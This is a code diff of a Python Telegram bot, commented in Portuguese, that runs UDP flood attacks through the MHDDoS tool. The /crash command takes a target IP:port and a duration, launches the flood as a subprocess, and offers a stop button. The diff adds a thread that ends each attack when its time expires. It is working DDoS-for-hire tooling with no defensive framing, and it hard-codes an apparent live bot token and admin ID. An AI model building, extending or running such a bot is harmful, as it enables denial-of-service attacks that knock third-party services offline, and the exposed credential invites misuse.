@@ -8,13 +8,12 @@ import telebot
 
 BOT_TOKEN = "7540053154:AAE7dArCFnKCcfk6QsQV5gt5NjjmohXoXLk"
 ADMIN_ID = 1775563404
-MHDDoS_PATH = os.path.abspath("./MHDDoS")  # Caminho absoluto para o diretório do MHDDoS
-ALLOWED_GROUPS = [-1002207288649]  # ID dos grupos permitidos
+MHDDoS_PATH = os.path.abspath("./MHDDoS")
+ALLOWED_GROUPS = [-1002256652548]
 
 bot = telebot.TeleBot(BOT_TOKEN)
 active_attacks = {}
 lock = Lock()
-
 
 @bot.message_handler(commands=["start"])
 def handle_start(message):
@@ -29,15 +28,14 @@ def handle_start(message):
         parse_mode="Markdown",
     )
 
-
 @bot.message_handler(commands=["crash"])
 def handle_crash(message):
     if message.chat.id not in ALLOWED_GROUPS:
         return
 
     telegram_id = message.from_user.id
-
     args = message.text.split()
+
     if len(args) != 3 or ":" not in args[1]:
         bot.reply_to(
             message,
@@ -53,7 +51,6 @@ def handle_crash(message):
     ip_port = args[1]
     duration = int(args[2])
 
-    # Verifica os limites de duração
     if duration < 5 or duration > 900:
         bot.reply_to(
             message,
@@ -74,10 +71,8 @@ def handle_crash(message):
         country = "Desconhecido"
         org = "Desconhecida"
 
-    # Define os argumentos fixos para UDP e threads
     attack_type = "UDP"
     threads = "10"
-
     command = f"cd {MHDDoS_PATH} && python3 start.py {attack_type} {ip_port} {threads} {duration}"
 
     with lock:
@@ -86,7 +81,7 @@ def handle_crash(message):
         )
         if telegram_id not in active_attacks:
             active_attacks[telegram_id] = []
-        active_attacks[telegram_id].append(process)
+        active_attacks[telegram_id].append((process, time.time() + duration))
 
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("❌ Parar ataque", callback_data=f"stop_{telegram_id}"))
@@ -102,7 +97,6 @@ def handle_crash(message):
         parse_mode="Markdown",
     )
 
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
 def handle_stop_attack(call):
     telegram_id = int(call.data.split("_")[1])
@@ -116,7 +110,7 @@ def handle_stop_attack(call):
     if telegram_id in active_attacks:
         with lock:
             processes = active_attacks[telegram_id]
-            for process in processes:
+            for process, _ in processes:
                 process.terminate()
             del active_attacks[telegram_id]
 
@@ -132,6 +126,19 @@ def handle_stop_attack(call):
     else:
         bot.answer_callback_query(call.id, "❌ Nenhum ataque ativo encontrado.")
 
+def monitor_attacks():
+    while True:
+        with lock:
+            for telegram_id, processes in list(active_attacks.items()):
+                for process, end_time in list(processes):
+                    if time.time() > end_time:
+                        process.terminate()
+                        processes.remove((process, end_time))
+                        if not processes:
+                            del active_attacks[telegram_id]
+        time.sleep(1)
 
 if __name__ == "__main__":
+    import threading
+    threading.Thread(target=monitor_attacks, daemon=True).start()
     bot.infinity_polling()
